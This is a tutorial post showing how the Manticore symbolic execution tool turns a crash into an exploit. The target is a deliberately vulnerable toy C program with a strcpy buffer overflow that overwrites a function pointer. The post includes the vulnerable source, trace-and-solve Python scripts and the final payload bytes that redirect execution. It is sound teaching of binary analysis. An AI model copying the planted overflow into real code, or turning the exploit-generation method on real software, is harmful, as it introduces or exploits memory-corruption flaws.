First steps with Manticore: Building an exploit
===============================================

This post aims to introduce some basic features of Manticore and how to customize it.

The minimal example to launch Manticore is:

``` python
m = Manticore(prog, params)
m.run()
```

Manticore will then explore all the possible paths of the program for the given parameters.

While exploring paths is a common use-case of symbolic execution, the flexibility of Manticore allows the user to create more specific analyses.
This article shows how to develop an analysis which converts a crash into an exploit.


The targeted program
--------------------

Let us consider the following program to exploit:

```c


/*
 *
 * Compile with :
 *   $ gcc bof.c -o bof -m32 -static
 *
*/


#include <stdio.h>
#include <string.h>
#include <stdlib.h>

typedef struct {
    char buf[4];
    void (*f)();
} Some_struct;

void call_me(){
    printf("Call me\n");
    exit(0);
}

void nothing(){
}

int vuln(char *src)
{
    Some_struct st;
    st.f = nothing;
    strcpy(st.buf, src); // buffer overflow
    st.f();
    return 0;
}

int main(int argc, char* argv[]){

    if(argc != 2){
        printf("Usage ./bof input");
    }

    if(argv[1][0] == 'A' ){ // the input has to start with 'A'
        vuln(argv[1]);
        return 0;
    }
}

```

Here, there is a classic buffer overflow in `vuln` allowing to overwrite the pointer `f` and so to hijack the execution flow.

The input `AAAAAAAAAAAAAAAAAAAAAAA`triggers the crash:
```shell
$ ./bof AAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)

```

Our goal now is to use Manticore to mutate the input `AAAAAAAAAAAAAAAAAAAAAAA`  to execute the function `call_me`.

We divide our approach into two steps: instead of exploring all the paths, we want to analyze only the one triggering the crash, so our first step is to record the instructions leading to the crash using the concrete input.
The second step is to analyze this path, but this time with a symbolic input.

First step: tracing the program
--------------------------------

Let us see how to trace a program with Manticore.
We use in this part the concrete input (`AAAAAAAAAAAAAAAAAAAAAAA`), to make Manticore explore only one path.

The simplest way to customize an analysis is by using hooks.
A hook executes a user-defined function before the execution of a given instruction (or it can be applied to all the instructions).
For the concrete execution, the hook will simply store all the instructions executed.

A `state` object is given as the parameter of a hook, which allows to manipulate data of the currently analyzed path.
The field `state.cpu.PC` holds the current PC, so we simply store it into the `context` of our analysis (which kept information during the analysis).

```python
from manticore.native import Manticore

# prog = sys.argv[1]
prog = "test_exploit_generation_example/bof"
# params = sys.argv[2:]
params = ["AAAAAAAAAAAAAAAAAAAAAAA"]

m = Manticore(prog, params)
m.verbosity(2)
# 'trace' will contain the executed instructions
m.context["trace"] = []

# None: The hook will be applied to all the instructions
@m.hook(None)
def record_trace(state):
    pc = state.cpu.PC
    ins = state.cpu.instruction
    # Store the instruction
    with m.locked_context() as c:
        c["trace"] += [pc]

        # We manipulate directly capstone instruction
        c["last_ins"] = "%s %s" % (ins.mnemonic, ins.op_str)
        # print(state.cpu)
        # print(state.mem)

m.run()

# Print number of instructions recorded and the last executed
print("%d instructions are recorded" % len(m.context["trace"]))
print("Last instruction executed:")
print("0x%x: %s" % (m.context["trace"][-1], m.context["last_ins"]))
```

We run the script as follows:

```shell
$ python record.py ./bof  AAAAAAAAAAAAAAAAAAAAAAA
5648 instructions are recorded  # the number of instructions recorded may differ
Last instruction executed:
0x80488d5: call eax
```



Second step: exploit generation
-------------------------------


Now we can use the list of instructions to guide the symbolic execution towards the crash.
Manticore uses the special character `+` to express a symbolic input in the command line, so our input becomes `+++++++++++++++++++++++`.

During the symbolic execution, we need to compare the currently explored path with the one we just recorded.
Manticore is still under development, and its API is still evolving, so some features are not yet implemented. One of these missing features is the ability to store information on one path, without sharing it with the others (`context` previously used is shared between all the paths).
So, in the current state, we canâ€™t store the instructions executed for multiple paths. Nevertheless, `state.visited` contains the set of instructions visited on the current path. While using `state.visited` for the guiding is not perfect (it could lead to consider wrong paths, e.g. in the case of loops), it is sufficient for our example.

The hook `follow_trace` is defined as follow:

```python
# trace contains the list of instructions previously recorded
trace_set = set(trace)  # convert the list to a set

# None: The hook will be applied to all the instructions
@m.hook(None)
def follow_trace(state):
	if "visited" not in state.context:
		state.context["visited"] = set()
	state.context["visited"].add(state.cpu.PC)

	# We stop to explore the current path if it doesn't follow the targeted path
	if not state.context["visited"] <= trace_set:
		print("State diverge at 0x%x" % state.cpu.PC)
		state.abandon()

m.run()
```

We can now use a second hook, `crash_analysis`, triggered only on `pc_crash`, which will mutate the input to hijack the execution towards `call_me`.
As we know that the crash occurred on a `call eax` instruction, we simply force `eax` to point to `call_me` (@0x0804887c in our example).
It corresponds to adding the constraint `state.cpu.EAX ==  0x0804887c` to the path predicate.
Finally, we simply need to ask the solver to solve the path predicate and to evaluate the value of `argv[1]`(represented by the input named `ARGV_1`).

``` python
# The hook will be applied only to the instruction @pc_crash
@m.hook(pc_crash)
def crash_analysis(state):
	# Add the constraint on eax
	state.constrain(state.cpu.EAX == 0x0804887C)  # 0x0804887c = @call_me
	# Retrieve the arguments corresponding to argv[1]
	argv_1 = next((i for i in state.input_symbols if i.name == "ARGV1"), None)
	if argv_1:
		# Ask the value of argv_1 to the solver
		val_argv_1 = state.solve_one(argv_1)
		# Pretty print of the solution
		print("The solution is:")
		print("\\x" + "\\x".join("{:02x}".format(c) for c in val_argv_1))
	state.abandon()
```


The complete crash analysis
--------------------------

If we put everthing in one python file, with a proper main function, we get:

```python
#
# Usage: python crash_analysis.py ./prog  -- argv_conc -- arg_symbolic
#
# manticore uses '+' to know which parts of the argv are symbolic.
# In our example it gives:
# python crash_analysis.py ./bof  -- AAAAAAAAAAAAAAAAAAAAAAA -- +++++++++++++++++++++++
#
import sys
from manticore.native import Manticore


def concrete_run(prog, params):
    print("Starting concrete execution")

    m = Manticore(prog, params)
    # 'trace' will contain the executed instructions
    m.context["trace"] = []

    # None: The hook will be applied to all the instructions
    @m.hook(None)
    def record_trace(state):
        pc = state.cpu.PC

        # Store the instruction
        with m.locked_context() as c:
            c["trace"] += [pc]

    m.run()

    # Print number of instructions recorded

    with m.locked_context() as c:
        print("%d instructions are recorded" % len(c["trace"]))
        return c


def symbolic_run(prog, params, trace, pc_crash):
    print("Starting symbolic execution")

    trace_set = set(trace)
    m = Manticore(prog, params)

    # The hook will be applied only to the instruction @pc_crash
    @m.hook(pc_crash)
    def crash_analysis(state):
        # Add the constraint on eax
        state.constrain(state.cpu.EAX == 0x0804887C)  # 0x0804887c = @call_me
        # Retrieve the arguments corresponding to argv[1]
        argv_1 = next((i for i in state.input_symbols if i.name == "ARGV1"), None)
        if argv_1:
            # Ask the value of argv_1 to the solver
            val_argv_1 = state.solve_one(argv_1)
            # Pretty print of the solution
            print("The solution is:")
            print("\\x" + "\\x".join("{:02x}".format(c) for c in val_argv_1))
        state.abandon()

    # trace contains the list of instructions previously recorded
    trace_set = set(trace)  # convert the list to a set

    # None: The hook will be applied to all the instructions
    @m.hook(None)
    def follow_trace(state):
        if "visited" not in state.context:
            state.context["visited"] = set()
        state.context["visited"].add(state.cpu.PC)

        # We stop to explore the current path if it doesn't follow the targeted path
        if not state.context["visited"] <= trace_set:
            print("State diverge at 0x%x" % state.cpu.PC)
            state.abandon()

    m.run()


if __name__ == "__main__":

    targeted_prog = sys.argv[1]

    first_placeholder = 0
    last_placeholder = 0

    # Look for the "--" placeholders
    for i in range(0, len(sys.argv)):
        argv = sys.argv[i]
        if argv == "--":
            if first_placeholder > 0:
                last_placeholder = i
            else:
                first_placeholder = i

    # Look for the concrete and symbolic arguments
    concrete_argv = sys.argv[first_placeholder + 1 : last_placeholder]
    symb_argv = sys.argv[last_placeholder + 1 :]

    # Launch the concrete execution
    context = concrete_run(targeted_prog, concrete_argv)

    # Launch the symbolic execution
    # We use the last element of context['trace'] to determin the crashing instruction
    symbolic_run(targeted_prog, symb_argv, context["trace"], context["trace"][-1])
```

This script is run with:

```shell
$ python crash_analysis.py ./bof  -- AAAAAAAAAAAAAAAAAAAAAAA -- +++++++++++++++++++++++
Starting concrete execution
Crash found at 0x80488d5
Instruction: call eax
5955 instructions are recorded
Starting symbolic execution
State diverge at 0x8048944
[..]
The solution is:
\x41\x01\x01\x01\x7c\x88\x04\x08\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01
```

Now, if we use this solution as the input of the original program, it triggers the targeted function:

```
$ ./bof $(python -c 'print "\x41\x01\x01\x01\x7c\x88\x04\x08\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01 "')
Call me
```

